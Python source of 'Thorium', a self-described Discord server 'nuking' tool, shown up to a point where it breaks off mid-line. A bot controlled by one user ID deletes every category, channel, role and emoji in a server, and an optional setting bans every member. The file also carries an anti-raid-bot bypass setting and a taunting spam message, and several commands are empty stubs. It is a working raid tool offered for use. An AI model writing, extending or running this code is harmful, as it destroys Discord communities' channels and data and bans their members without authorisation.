num = 5
import os, time
for i in range(5):
    print("WARNING THIS NUKING TOOL IS UNFINISHED\nIT CAN CRASH AND IS MAYBE EVEN DETECTED IF YOU SEE THIS\nPRESS ENTER TO START")
    print(f"Wait: {num - i}")
    time.sleep(1)
    os.system("cls")
input(">")
try:
    import discord, discord_webhook, fade, colorama, threading, rich, random
    from platform import system
    os.system("title Thorium")
    from discord import MFALevel, VerificationLevel
    from config import UserID, Prefix, channelname, SpamMSG, auto_ban, Antiraidbotbypass, Embedcolor, NukeToken
    from rich import print
    from base64 import b64encode
    from colorama import Fore, Style, Back
    colorama.init(strip=False)
    from rich.progress import track
    from discord.ext import commands
    import asyncio
    rainbow = 1    
    my_os = system()
except:
    os.system("pip install discord")
    os.system("pip install discord_webhook")
    os.system("pip install discord.py")
    os.system("pip install fade")
    os.system("pip install colorama")
    os.system("pip install rich")
    os.system("pip install asyncio")
    os.startfile(__file__)
    exit()
# Set logging 
# level to CRITICAL
#Prefix="?"
#Channelname= "𝐓𝐡𝐨𝐫𝐢𝐮𝐦᲼𝐨𝐧᲼𝐭𝐨𝐩"
#SpamMSG= "You got nuked by Dummergoki lmao!"talk
#UserID = 605369271882874880
#ban = True
#randomx = True
#Embedcolor = 0x00ff00
Channelnamesave = channelname
Channelname = Channelnamesave
Channelnameprint = Channelnamesave


cmdlist = r"""
[—————————————————————————————————[Main]——————————————————————————————————]
|'Help'     -This opens a with all commands!                              |
|'Nuke'     -A nukebot that has alot of commands!                         |
|'Webspam'  -Just a webhook spaming tool is kinda useful...               | 
[—————————————————————————————————[Fun]———————————————————————————————————]
|'IDToken'  -Basicly discord id to start of the token                     |
[————————————————————————————————[Other]——————————————————————————————————]
|'Restart'  -Restarts the program                                         |
[—————————————————————————————————————————————————————————————————————————]
"""
rolename="bob"

getoutofmyhead = r"""
██╗     ██╗████████╗██╗  ██╗██╗██╗   ██╗███╗   ███╗    ██╗   ██╗██████╗ 
██║     ██║╚══██╔══╝██║  ██║██║██║   ██║████╗ ████║    ██║   ██║╚════██╗
██║     ██║   ██║   ███████║██║██║   ██║██╔████╔██║    ██║   ██║ █████╔╝
██║     ██║   ██║   ██╔══██║██║██║   ██║██║╚██╔╝██║    ╚██╗ ██╔╝ ╚═══██╗
███████╗██║   ██║   ██║  ██║██║╚██████╔╝██║ ╚═╝ ██║     ╚████╔╝ ██████╔╝
╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝      ╚═══╝  ╚═════╝ 

░█▀▀░█▀▄░█▀█░█▀▀░█░█░█▀▀░█▀▄░█
░█░░░█▀▄░█▀█░█░░░█▀▄░█▀▀░█░█░▀
░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀▀░░▀
░▄▀░░█▀█░█▀█░░░█░█░▀█▀░█▀▄░█░█░█▀▀░▀▄░
░█░░░█░█░█░█░░░▀▄▀░░█░░█▀▄░█░█░▀▀█░░█░
░░▀░░▀░▀░▀▀▀░░░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░░
"""

logo = r"""
 ███████████ █████                          ███                            
░█░░░███░░░█░░███                          ░░░                             
░   ░███  ░  ░███████    ██████  ████████  ████  █████ ████ █████████████  
    ░███     ░███░░███  ███░░███░░███░░███░░███ ░░███ ░███ ░░███░░███░░███ 
    ░███     ░███ ░███ ░███ ░███ ░███ ░░░  ░███  ░███ ░███  ░███ ░███ ░███ 
    ░███     ░███ ░███ ░███ ░███ ░███      ░███  ░███ ░███  ░███ ░███ ░███ 
    █████    ████ █████░░██████  █████     █████ ░░████████ █████░███ █████
   ░░░░░    ░░░░ ░░░░░  ░░░░░░  ░░░░░     ░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░ 
————————————————————————————————————————————————————————————————————————————>
                type 'help' for a with all commands!
————————————————————————————————————————————————————————————————————————————>

"""


logo = fade.pinkred(logo)
colorama.init(strip=True)
os.system('cls' if os.name == 'nt' else 'clear')
print(logo)
getoutofmyhead = fade.purplepink(getoutofmyhead)
cmdlist = fade.pinkred(cmdlist)
colorama.init(strip=False)


#PROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESS
#PROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESS
#PROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESS
#PROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESS
#PROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESSPROCESS
def process():    
    try:
        from config import rolename
    except:
        rolename = "XXX"
    
    rolenamesave = rolename
    rolename = rolenamesave
    rolenameprint = rolenamesave

    
    rolename = str(rolenamesave)
    
    
    bot = commands.Bot(command_prefix = Prefix, help_command=None, allowed_mentions = discord.AllowedMentions(everyone = True), intents = discord.Intents.all())
    
    @bot.event  
    async def on_ready():
        await bot.change_presence(status=discord.Status.offline, activity=discord.Activity(type=discord.ActivityType.playing, name="Server Nuking!"))
        os.system('cls' if os.name == 'nt' else 'clear')
        logo2 = r"""
 ███████████ █████                          ███                            
░█░░░███░░░█░░███                          ░░░                             
░   ░███  ░  ░███████    ██████  ████████  ████  █████ ████ █████████████  
    ░███     ░███░░███  ███░░███░░███░░███░░███ ░░███ ░███ ░░███░░███░░███ 
    ░███     ░███ ░███ ░███ ░███ ░███ ░░░  ░███  ░███ ░███  ░███ ░███ ░███ 
    ░███     ░███ ░███ ░███ ░███ ░███      ░███  ░███ ░███  ░███ ░███ ░███ 
    █████    ████ █████░░██████  █████     █████ ░░████████ █████░███ █████
   ░░░░░    ░░░░ ░░░░░  ░░░░░░  ░░░░░     ░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░ 

"""
        logo2 = fade.pinkred(logo2)
        colorama.init(strip=True)
        #print(logo2)
        colorama.init(strip=False)

        #print('We Are logged in as: {0.user}'.format(bot))
        
    #@bot.command()  
    #async def Avatar(ctx):
    #    if ctx.author.id == UserID:
    #        await bot.user.edit(avatar=)
                
    @bot.command()  
    async def Delete(ctx, arg=None):
        guild = ctx.guild
        if ctx.author.id == UserID:
            if arg == "categories":
                #print("----------------------------------------->")
                time.sleep(0.15)
                #print("deleting categories...")
                for category in ctx.guild.categories:  
                    try:  
                        await category.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{category.name} (✓)" + Fore.RESET)
                    except:
                         print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{category} (X)" + Fore.RESET)
                #print("----------------------------------------->")
                    
            if arg == "channels":
                #print("----------------------------------------->")
                time.sleep(0.15)
                #print("deleting channels...")
                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{channel.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{channel} (X)" + Fore.RESET)
                #print("----------------------------------------->")
                    
            if arg == "roles":
                #print("----------------------------------------->")
                time.sleep(0.15)
                #print("deleting roles...")
                for role in ctx.guild.roles:  
                    try:  
                        await role.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{role.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{role} (X)" + Fore.RESET)
                #print("----------------------------------------->")

            if arg == "emojis":
                #print("----------------------------------------->")
                time.sleep(0.15)
                #print("deleting emojis...")
                for emoji in ctx.guild.emojis: 
                    try:  
                        await emoji.delete()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{emoji.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{emoji} (X)" + Fore.RESET)
                #print("----------------------------------------->")
    @bot.command()  
    async def Create(ctx, arg=None, arg2=None):
        guild = ctx.guild
        if ctx.author.id == UserID:
            pass
        
    @bot.command()  
    async def Kick(ctx, arg=None):
        if ctx.author.id == UserID:
            pass

    @bot.command()
    async def Timeout(ctx):
        if ctx.author.id == UserID:
            pass
        
    @bot.command()  
    async def Ban(ctx, arg=None):
        if ctx.author.id == UserID:
            pass
        
    @bot.command()  
    async def Profnuke(ctx, arg=None):
        if ctx.author.id == UserID:
            pass
        
    @bot.command()  
    async def Chatspam(ctx, arg=None):
        if ctx.author.id == UserID:
            pass
    async def Bypass(ctx, arg=None):
        if ctx.author.id == UserID:
            await ctx.message.delete()
            if arg == "True":
                Antiraidbotbypass = True
            if arg == "False":
                Antiraidbotbypass = False
    @bot.command()  
    async def Help(ctx, arg=None):
        if ctx.author.id == UserID:
            pass
    @bot.command()
    async def Stop(ctx):
        if ctx.author.id == UserID:
            exit()
    
    
    @bot.command()  
    async def Nuke(ctx):
        guild = ctx.guild
        if ctx.author.id == UserID:
            try:
                from config import rolename
                rolenamesave = rolename
                rolename = rolenamesave
                rolenameprint = rolenamesave
            except:
                pass
            rainbow = 1
            #print("----------------------------------------->")
            time.sleep(0.15)
            #print("deleting categories...")
            for category in ctx.guild.categories:  
                try:   
                    await category.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{category.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{category} (X)" + Fore.RESET)
            #print("----------------------------------------->")
                    
            #print("----------------------------------------->")
            time.sleep(0.15)
            #print("deleting channels...")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{channel.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{channel} (X)" + Fore.RESET)
            #print("----------------------------------------->")
                   
            #print("----------------------------------------->")
            time.sleep(0.15)
            #print("deleting roles...")
            for role in ctx.guild.roles:  
                try:  
                    await role.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{role.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{role} (X)" + Fore.RESET)
            #print("----------------------------------------->")
            from config import auto_ban
            if auto_ban == True:
                time.sleep(0.15)
                #print("ban all members...")
                for member in ctx.guild.members:
                    try:
                        await member.ban()
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{member.name} (✓)" + Fore.RESET)
                    except:
                        print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{member} (X)" + Fore.RESET)
            #print("----------------------------------------->")
            time.sleep(0.15)
            #print("deleting emojis...")
            for emoji in ctx.guild.emojis: 
                try:  
                    await emoji.delete()
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTGREEN_EX + f"{emoji.name} (✓)" + Fore.RESET)
                except:
                    print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + Fore.LIGHTRED_EX + f"{emoji} (X)" + Fore.RESET)
            #print("----------------------------------------->")
            for i in range (10):
                r1 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r2 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r3 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r4 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r5 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r6 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r7 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r8 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r9 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r10 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r11 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r12 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r13 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r14 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", 